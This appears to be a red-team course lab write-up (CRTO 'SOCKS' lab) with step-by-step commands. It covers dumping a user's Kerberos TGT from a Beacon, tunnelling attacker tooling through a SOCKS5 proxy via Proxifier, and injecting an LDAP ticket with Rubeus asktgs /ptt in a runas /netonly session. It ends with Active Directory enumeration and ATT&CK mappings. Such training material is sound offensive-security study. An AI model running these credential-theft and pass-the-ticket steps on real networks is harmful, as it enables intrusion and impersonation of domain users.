# CRTO — SOCKS Lab

**Course:** Red Team Ops (CRTO) by RastaMouse — Zero Point Security
**Lab:** SOCKS
**Objective:** Obtain an LDAP service ticket via a stolen TGT, route attacker tooling through a SOCKS proxy, and perform domain enumeration as an impersonated user from the attacker desktop

---

## The Full Chain

```
krb_dump → extract rsteel's TGT from SYSTEM Beacon (as covered in User Impersonation lab)
    ↓
socks 1080 socks5 → start SOCKS5 proxy on Beacon
    ↓
Add static DNS entries for lon-dc-1 on attacker desktop
    ↓
Proxifier → route 10.10.120.0/23 traffic through team server SOCKS5 proxy
    ↓
runas /netonly → create isolated network-only logon session as rsteel (fake password)
    ↓
Rubeus asktgs → use rsteel's TGT to request LDAP service ticket → /ptt injects into session
    ↓
Get-AD* cmdlets → enumerate domain via LDAP over SOCKS proxy, authenticated as rsteel
```

---

## Step 1 — Dump rsteel's TGT

```bash
# From SYSTEM Beacon (covered in User Impersonation lab)
krb_triage
krb_dump /user:rsteel /service:krbtgt
```

> Save the base64-encoded ticket in Notepad/VSCode — needed for the Rubeus `asktgs` command later. The ticket is consumed by Rubeus on the attacker desktop, not injected into Beacon this time.

---

## Step 2 — Start SOCKS Proxy on Beacon

```bash
socks 1080 socks5
```

**Key points:**

| Property | Detail |
|---|---|
| Port | `1080` — standard SOCKS port, configurable |
| Protocol | `socks5` — supports authentication and UDP (vs socks4 which doesn't) |
| Privilege required | **None** — SOCKS proxy can be started from a medium-integrity Beacon |
| Traffic flow | Attacker desktop → team server (10.0.0.5:1080) → Beacon → target network |

**TTP:** T1090.001 — Proxy: Internal Proxy

> The SOCKS proxy tunnels attacker-side tooling (native Windows cmdlets, Proxifier-wrapped apps) through the Beacon into the target network. This means tools that can't be run inside Beacon (like RSAT cmdlets) can still reach internal hosts.

---

## Step 3 — Add Static DNS Records

Run Terminal as Administrator on the attacker desktop:

```powershell
Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value "10.10.120.1 lon-dc-1 lon-dc-1.contoso.com contoso.com"
```

**Why this is necessary:**
- The attacker desktop has no DNS visibility into the target domain — it can't resolve `lon-dc-1.contoso.com` natively
- LDAP and Kerberos both require hostname resolution — IP-only connections cause certificate/SPN mismatches
- Static hosts entries bypass the DNS problem without needing to reconfigure DNS servers
- Must be done before Kerberos ticket requests — the DC hostname must resolve for the TGS-REQ to succeed

---

## Step 4 — Configure Proxifier

Proxifier intercepts outbound TCP connections from any process and routes them through a SOCKS proxy transparently — the application doesn't need to be proxy-aware.

### Add Proxy Server

```
Profile > Proxy Servers > Add
Address:  10.0.0.5
Port:     1080
Protocol: SOCKS Version 5
```

> When prompted "use as default proxy" → **No**. You only want to proxy specific traffic, not all attacker desktop traffic.

### Add Proxification Rule

```
Profile > Proxification Rules > Add
Name:         Beacon
Target hosts: 10.10.120.0/23
Action:       Proxy SOCKS5 10.0.0.5
```

**What this rule does:** Any process on the attacker desktop that opens a TCP connection to `10.10.120.0/23` (the target internal network) gets transparently redirected through the SOCKS5 proxy at `10.0.0.5:1080` → through Beacon → to the target.

> The `/23` subnet covers both `10.10.120.x` and `10.10.121.x` — make sure the rule covers all target subnets in your environment.

---

## Step 5 — Create Isolated Network Logon Session

```powershell
# Run from attacker desktop Terminal (as admin)
runas /netonly /user:CONTOSO\rsteel powershell.exe
# Password: FakePass (intentionally fake — same pattern as make_token)
```

**What `runas /netonly` does:**

| Flag | Behaviour |
|---|---|
| `/netonly` | Creates a logon session where local execution uses the current user, but **all network authentication uses the specified credentials** |
| Password | Not validated locally — only used when network auth is attempted (Kerberos takes over via PTT) |

> This is the command-line equivalent of `make_token` in Beacon. The `powershell.exe` spawned runs locally as your attacker user but presents rsteel's identity (via the injected ticket) for all network operations.

**Why not just use the current PowerShell session:**
Kerberos tickets are tied to logon sessions. Injecting a ticket into an existing session would affect all processes using it. `runas /netonly` creates an isolated session so the ticket is scoped to this specific PowerShell instance only.

---

## Step 6 — Request LDAP Service Ticket and Inject

Inside the `runas /netonly` PowerShell window:

```powershell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:ldap/lon-dc-1 /ticket:[ENCODED TGT] /dc:lon-dc-1 /ptt
```

**Rubeus `asktgs` flag breakdown:**

| Flag | Value | Purpose |
|---|---|---|
| `/service` | `ldap/lon-dc-1` | SPN of the service ticket to request — LDAP on lon-dc-1 |
| `/ticket` | Base64 TGT | rsteel's TGT used to authenticate to the KDC for the TGS-REQ |
| `/dc` | `lon-dc-1` | DC to send the TGS-REQ to |
| `/ptt` | — | Pass the ticket — inject the returned TGS directly into the current logon session |

**What happens at the protocol level:**
```
Rubeus sends TGS-REQ to lon-dc-1 KDC using rsteel's TGT
    ↓
KDC returns TGS encrypted with the LDAP service key (DC's computer account hash)
    ↓
Rubeus injects TGS into the runas /netonly session via /ptt
    ↓
Any LDAP connection from this session presents the TGS → DC grants access as rsteel
```

### Verify the Ticket

```powershell
# Native klist won't see tickets in a /netonly session — use Rubeus instead
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe klist
```

> `klist` fails in `/netonly` sessions because the session is isolated from the standard ticket cache view. Rubeus `klist` reads the ticket cache directly and bypasses this limitation.

---

## Step 7 — Domain Enumeration via SOCKS

From the `runas /netonly` PowerShell (with LDAP ticket injected + Proxifier routing active):

```powershell
# All queries go: attacker PS → Proxifier → SOCKS5 → Beacon → lon-dc-1 LDAP
Get-ADComputer -Filter * -Server lon-dc-1
Get-ADUser -Filter * -Server lon-dc-1
Get-ADOrganizationalUnit -Filter * -Server lon-dc-1
```

**`-Server lon-dc-1`** — explicitly targets the DC rather than relying on auto-discovery (which would fail without domain DNS).

**TTP:** T1018 — Remote System Discovery
**TTP:** T1087.002 — Account Discovery: Domain Account

---

## How the Full Proxy Chain Works

```
Get-ADComputer -Server lon-dc-1
    ↓
attacker desktop opens TCP:389 to 10.10.120.1 (lon-dc-1)
    ↓
Proxifier intercepts → redirects to SOCKS5 at 10.0.0.5:1080
    ↓
Team server SOCKS listener → forwards through Beacon
    ↓
Beacon (inside target network) opens TCP:389 to lon-dc-1
    ↓
DC receives LDAP request authenticated with rsteel's TGS
    ↓
Response flows back through Beacon → team server → Proxifier → attacker PS
```

---

## SOCKS vs Direct Execution Comparison

| Approach | How | When |
|---|---|---|
| Execute-assembly / powerpick | Run tooling inside Beacon on target | Preferred — no proxy needed, runs in-process |
| SOCKS + Proxifier | Route attacker-side tools through Beacon | When you need native tools (RSAT, browser, etc.) that can't run inside Beacon |
| Port forward | Forward specific port through Beacon | Single-service access (RDP, web app, etc.) |

---

## MITRE ATT&CK Mapping

| TTP | Technique | Detail |
|---|---|---|
| T1090.001 | Proxy: Internal Proxy | SOCKS5 proxy via Beacon tunnels attacker traffic |
| T1550.003 | Pass the Ticket | rsteel's TGT used to obtain and inject LDAP TGS |
| T1018 | Remote System Discovery | Get-ADComputer via LDAP over SOCKS |
| T1087.002 | Domain Account Discovery | Get-ADUser via LDAP over SOCKS |
| T1482 | Domain Trust Discovery | Get-ADOU via LDAP over SOCKS |

---

## Key Takeaways

- SOCKS proxy requires **no admin or SYSTEM** — start it on whichever Beacon is convenient
- Static `/etc/hosts` entries are mandatory — Kerberos and LDAP both require hostname resolution, not just IP
- `runas /netonly` is the attacker-desktop equivalent of `make_token` — creates an isolated network session where the fake password is never validated
- **Native `klist` won't work in `/netonly` sessions** — always use `Rubeus.exe klist` to verify ticket injection
- Proxifier must be scoped to the target subnet only — avoid routing all traffic through the proxy
- `asktgs /ptt` skips the `kerberos_ticket_use` step — Rubeus requests the TGS and injects it in one operation
- This workflow enables any attacker-side tool (RSAT, BloodHound, browser, custom scripts) to operate against internal targets transparently
